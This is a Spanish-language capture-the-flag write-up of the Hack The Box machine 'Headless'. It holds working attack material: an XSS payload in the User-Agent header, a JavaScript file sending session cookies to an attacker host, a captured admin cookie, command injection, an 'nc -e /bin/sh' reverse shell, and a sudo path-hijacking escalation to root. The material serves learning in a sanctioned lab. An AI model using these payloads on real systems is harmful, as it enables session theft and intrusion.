---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - XSS
  - CookieStealing
  - CommandInjection
  - ReverseShell
  - Sudo
  - PathHijacking
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del Sistema|Enumeración del Sistema]]
	- [[#Enumeración#Enumeración de Puertos|Enumeración de Puertos]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Stored XSS → Cookie Stealing|Stored XSS → Cookie Stealing]]
	- [[#Explotación#Command Injection|Command Injection]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Sudo → Path Hijacking|Sudo → Path Hijacking]]

---
# Headless

![](Screenshots/Pasted%20image%2020260512121559.png)

> Máquina de Hack The Box llamada **[Headless](https://app.hackthebox.com/machines/Headless)**, centrada en la explotación de una aplicación web vulnerable desarrollada en Python.  
> La intrusión comienza identificando funcionalidades administrativas ocultas y una vulnerabilidad **XSS** explotable mediante el encabezado `User-Agent`, permitiendo el robo de cookies de sesión.  
> Tras obtener acceso al panel administrativo, se descubre una vulnerabilidad de **Command Injection** que permite ejecución remota de comandos y acceso inicial al sistema.  
> Finalmente, se realiza una escalada de privilegios abusando de un script ejecutable mediante `sudo` vulnerable a **Path Hijacking**, obteniendo acceso como `root`.

---
## Enumeración
### Enumeración del Sistema

```PowerShell
ping -c 1 10.129.35.79
PING 10.129.35.79 (10.129.35.79) 56(84) bytes of data.
64 bytes from 10.129.35.79: icmp_seq=1 ttl=63 time=43.8 ms

--- 10.129.35.79 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.793/43.793/43.793/0.000 ms
```

El TTL de `63` (típico en redes Linux con decremento de 1 salto) sugiere que el sistema objetivo es Linux.
### Enumeración de Puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.35.79 -oG allPorts
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```

```PowerShell
nmap -p22,5000 -sCV 10.129.35.79 -oN targeted
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Under Construction
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos descubiertos:
- `22 → SSH`
- `5000 → HTTP`
### HTTP

```HTTP
http://10.129.35.79:5000/
```

![](Screenshots/Pasted%20image%2020260512095744.png)

Se accede al botón `For questions`.

```PowerShell
http://10.129.35.79:5000/support
```

![](Screenshots/Pasted%20image%2020260512114623.png)
#### Fuzzing Web

```PowerShell
gobuster dir -u http://10.129.35.79:5000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
support              (Status: 200) [Size: 2363]
dashboard            (Status: 500) [Size: 265]
Progress: 207641 / 207641 (100.00%)
===============================================================

dirb http://10.129.35.79:5000/
---- Scanning URL: http://10.129.35.79:5000/ ----
+ http://10.129.35.79:5000/dashboard (CODE:500|SIZE:265)                                                                                                                                                                                   
+ http://10.129.35.79:5000/support (CODE:200|SIZE:2363)
```

Se encuentra el directorio `/dashboard`.

El endpoint `/dashboard` devuelve un error de acceso, sugiriendo la existencia de un panel restringido a usuarios autenticados o administradores.

Esto, nos hace pensar en poder realizar un ataque **XSS** para robar la **cookie de sesión**.

---
## Explotación
### Stored XSS → Cookie Stealing

Se intercepta la petición con *Burp Suite*.

![](Screenshots/Pasted%20image%2020260512115031.png)

Se prueba el **XSS** con los parámetros de contacto, pero no funciona.

Se prueba en el *User-Agent*.

![](Screenshots/Pasted%20image%2020260512115715.png)

![](Screenshots/Pasted%20image%2020260512115817.png)

Se realiza correctamente el **XSS**.

Se crea un archivo llamado `pwned.js`.

```JS
var request = new XMLHttpRequest();
request.open('GET', 'http://[ATTACKER_IP]:1234/?cookie=' + document.cookie);
request.send();
```

Máquina atacante:

```PowerShell
python -m http.server 1234
```

Máquina victima:

```PowerShell
# Se vuelve a lanzar la petición pero cambiando el User-Agent
User-Agent: <script src="http://[ATTACKER_IP]/pwned.js"></script>
```

Se obtiene la respuesta:

```PowerShell
10.129.35.79 - - [12/May/2026 18:22:47] "GET /pwned.js HTTP/1.1" 200 -
10.129.35.79 - - [12/May/2026 18:22:48] "GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
```

Se accede al directorio: `/dashboard` y se cambia la **cookie**.

![](Screenshots/Pasted%20image%2020260512120600.png)
### Command Injection

Se intercepta la petición con *Burp Suite*.

![](Screenshots/Pasted%20image%2020260512120833.png)

Se prueba la posibilidad de inyección de comandos concatenando operadores del sistema (`;`, `&&`, `|`) después del parámetro `date`.

![](Screenshots/Pasted%20image%2020260512120932.png)

La aplicación ejecuta comandos del sistema de forma insegura, permitiendo ejecución arbitraria de comandos.
### Reverse Shell

Al poder ejecutar comandos, se ejecuta una **Reverse Shell**.

Máquina atacante:

```PowerShell
nc -nlvp 9001
```

Máquina víctima:

```PowerShell
nc -e /bin/sh [ATTACKER_IP] 9001
```

Se obtiene una consola interactiva con `dvir`.

La flag de `usuario` se encuentra en: `/home/dvir`.

---
## Escalada de Privilegios
### Sudo → Path Hijacking

```PowerShell
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

Se analiza el script `syscheck`.

```PowerShell
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

El script ejecuta `./initdb.sh` utilizando una ruta relativa en lugar de una ruta absoluta.  
  
Esto permite controlar qué binario o script será ejecutado dependiendo del directorio actual de trabajo (*Current Working Directory*), derivando en una vulnerabilidad de **Path Hijacking**.

Se crea un script malicioso con el mismo nombre para abusar de la ejecución relativa.

```PowerShell
cd /tmp
echo -e '#!/bin/bash\n/bin/bash' > /tmp/initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
```

Se obtiene una consola interactiva con `root`.

La flag de `root` se encuentra en: `/root`.

---


